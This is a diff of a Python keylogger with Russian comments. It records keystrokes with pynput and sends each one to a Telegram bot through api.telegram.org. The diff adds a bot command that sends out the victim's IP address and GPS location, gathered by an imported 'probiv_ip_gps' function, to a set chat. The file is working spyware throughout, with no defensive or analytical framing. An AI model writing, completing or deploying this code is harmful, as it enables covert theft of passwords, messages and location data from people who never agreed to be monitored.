@@ -3,17 +3,23 @@ import pynput
 from pynput.keyboard import Key, Listener
 import telebot
 import requests
-from test import probiv_ip_gps # попытка пробива пользователя и скинуть его в тотже тг бот 
+from test import probiv_ip_gps #попытка пробива пользователя и скинуть его в тотже тг бот
 
 
-TOKEN = "BOT TOKEN" #vvodim token from botfather
-chat_id = "813122679"
-message = probiv_ip_gps()
+TOKEN = "" #vvodim token from botfather
+chat_id = "" #информацию получает конкретный пользователь с уникальным chat_id
+mes = probiv_ip_gps() #наш ip, gps
+bot = telebot.TeleBot(TOKEN)
 
-# url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
-# print(requests.get(url).json()) # Эта строка отсылает сообщение
 
 keys = []
+
+
+@bot.message_handler(commands=['ip'])
+def start_message(m):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={mes}"
+    requests.get(url).json() #отсылаем сообщение
+bot.infinity_polling()
 
 
 def on_press(key):
@@ -27,24 +33,23 @@ def on_press(key):
         #print('special key {0} pressed'.format(key))
         message = 'special key {0} pressed'.format(key)
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
-    print(requests.get(url).json())  # Эта строка отсылает сообщение
+    print(requests.get(url).json())  #отсылаем сообщение
 
 def write_file(keys):
 
     with open('log.txt', 'w') as f:
         for key in keys:
-            # removing ''
+            #удаление ''
             k = str(key).replace("'", "")
             f.write(k)
-            # explicitly adding a space after
-            # every keystroke for readability
+            #добавляем пробел
             f.write(' ')
 
 
 def on_release(key):
     print('{0} released'.format(key))
     if key == Key.esc:
-        # Stop listener
+        #Конец
         return False
 
 
